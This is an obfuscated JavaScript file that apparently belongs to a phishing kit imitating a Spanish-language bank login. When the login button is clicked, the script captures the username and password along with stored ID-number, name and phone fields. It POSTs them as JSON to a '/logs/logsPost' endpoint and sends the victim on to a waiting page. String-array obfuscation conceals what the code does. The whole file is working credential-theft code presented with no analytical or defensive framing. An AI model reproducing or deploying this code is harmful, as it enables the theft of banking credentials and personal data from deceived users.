const _0x2e7cb8 = _0x3758;
function _0x3758(_0x5a4029, _0x1642cb) {
  const _0x5c7ecd = _0x5c7e();
  return (
    (_0x3758 = function (_0x375806, _0x4468a7) {
      _0x375806 = _0x375806 - 0x1a6;
      let _0x30f1af = _0x5c7ecd[_0x375806];
      return _0x30f1af;
    }),
    _0x3758(_0x5a4029, _0x1642cb)
  );
}
(function (_0x5c9a17, _0x2c8b3d) {
  const _0x4ddece = _0x3758,
    _0x24b77c = _0x5c9a17();
  while (!![]) {
    try {
      const _0x28a1a3 =
        (parseInt(_0x4ddece(0x1bf)) / 0x1) *
          (-parseInt(_0x4ddece(0x1ac)) / 0x2) +
        (-parseInt(_0x4ddece(0x1c1)) / 0x3) *
          (parseInt(_0x4ddece(0x1b1)) / 0x4) +
        (parseInt(_0x4ddece(0x1b2)) / 0x5) *
          (-parseInt(_0x4ddece(0x1cc)) / 0x6) +
        (parseInt(_0x4ddece(0x1b3)) / 0x7) *
          (parseInt(_0x4ddece(0x1c3)) / 0x8) +
        -parseInt(_0x4ddece(0x1a8)) / 0x9 +
        -parseInt(_0x4ddece(0x1ad)) / 0xa +
        parseInt(_0x4ddece(0x1b0)) / 0xb;
      if (_0x28a1a3 === _0x2c8b3d) break;
      else _0x24b77c["push"](_0x24b77c["shift"]());
    } catch (_0x14a06f) {
      _0x24b77c["push"](_0x24b77c["shift"]());
    }
  }
})(_0x5c7e, 0x7afaf);
function _0x5c7e() {
  const _0x2887cb = [
    "7035200BwArAh",
    "Network\x20response\x20was\x20not\x20ok",
    "Ingresó\x20datos",
    "27645893hMsJqV",
    "4qLEzut",
    "5KbfPYy",
    "8610XftjfI",
    "docNumberMovil",
    "dudename",
    "focus",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "error",
    "POST",
    "value",
    "🔵​Bbv4",
    "json",
    "telnum",
    "passwordMovil",
    "1RLFeca",
    "href",
    "509367XHPkfB",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.",
    "3640gXUqfA",
    "user",
    "./wait.html",
    "preventDefault",
    "puser",
    "stringify",
    "PSE",
    "click",
    "setItem",
    "2899482fuhGjA",
    "getElementById",
    "metaInfo",
    "7118595rqHrnG",
    "btnLogin-page1",
    "location",
    "disabled",
    "843350BjapXb",
  ];
  _0x5c7e = function () {
    return _0x2887cb;
  };
  return _0x5c7e();
}
function updateLS() {
  const _0x23299f = _0x3758;
  LS[_0x23299f(0x1cb)]("info", JSON[_0x23299f(0x1c8)](info));
}
const button = document[_0x2e7cb8(0x1a6)](_0x2e7cb8(0x1a9)),
  userInput = document[_0x2e7cb8(0x1a6)](_0x2e7cb8(0x1b4)),
  passInput = document[_0x2e7cb8(0x1a6)](_0x2e7cb8(0x1be));
button["addEventListener"](_0x2e7cb8(0x1ca), async function (_0x2246d5) {
  const _0x3c8a68 = _0x2e7cb8;
  _0x2246d5[_0x3c8a68(0x1c6)](), (button["disabled"] = !![]);
  if (userInput[_0x3c8a68(0x1ba)] == "" && passInput[_0x3c8a68(0x1ba)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x3c8a68(0x1b6)](),
      (button[_0x3c8a68(0x1ab)] = ![]);
    return;
  } else {
    var _0x489712 = userInput[_0x3c8a68(0x1ba)],
      _0x39a022 = passInput[_0x3c8a68(0x1ba)];
    (info[_0x3c8a68(0x1a7)][_0x3c8a68(0x1c4)] = _0x489712),
      (info[_0x3c8a68(0x1a7)][_0x3c8a68(0x1c7)] = _0x39a022),
      updateLS();
    const _0xb7e16e = {
      reg: info[_0x3c8a68(0x1a7)]["cc"],
      name: info[_0x3c8a68(0x1a7)][_0x3c8a68(0x1b5)],
      cl: info["metaInfo"][_0x3c8a68(0x1bd)],
      us: info["metaInfo"][_0x3c8a68(0x1c4)],
      ps: info["metaInfo"][_0x3c8a68(0x1c7)],
      bn: _0x3c8a68(0x1bb),
      status: _0x3c8a68(0x1af),
      fuente: _0x3c8a68(0x1c9),
    };
    try {
      const _0xf96a0e = await fetch(url + "/logs/logsPost", {
        method: _0x3c8a68(0x1b9),
        headers: { "Content-Type": "application/json" },
        body: JSON["stringify"](_0xb7e16e),
      });
      if (!_0xf96a0e["ok"]) throw new Error(_0x3c8a68(0x1ae));
      const _0x1f1229 = await _0xf96a0e[_0x3c8a68(0x1bc)]();
      window[_0x3c8a68(0x1aa)][_0x3c8a68(0x1c0)] = _0x3c8a68(0x1c5);
    } catch (_0x4b3eb2) {
      console[_0x3c8a68(0x1b8)](_0x3c8a68(0x1b7), _0x4b3eb2),
        alert(_0x3c8a68(0x1c2)),
        (button[_0x3c8a68(0x1ab)] = ![]);
    }
  }
});
